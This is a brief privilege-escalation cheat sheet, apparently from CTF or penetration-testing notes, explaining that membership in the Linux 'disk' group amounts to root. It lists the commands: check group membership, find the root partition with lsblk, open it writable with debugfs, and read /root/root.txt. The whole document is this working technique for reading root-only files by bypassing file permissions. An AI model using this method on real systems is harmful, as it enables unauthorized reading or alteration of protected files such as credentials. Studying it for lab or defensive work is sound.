# disk Group - Raw Block Device Read

Membership in the `disk` group is effectively root — raw read/write on block devices bypasses normal file permissions entirely.

```bash
id                          # confirm membership in `disk`
lsblk                       # identify the root partition, e.g. /dev/nvme0n1p1
debugfs -w /dev/<root-partition>
# inside debugfs:
cat /root/root.txt
```

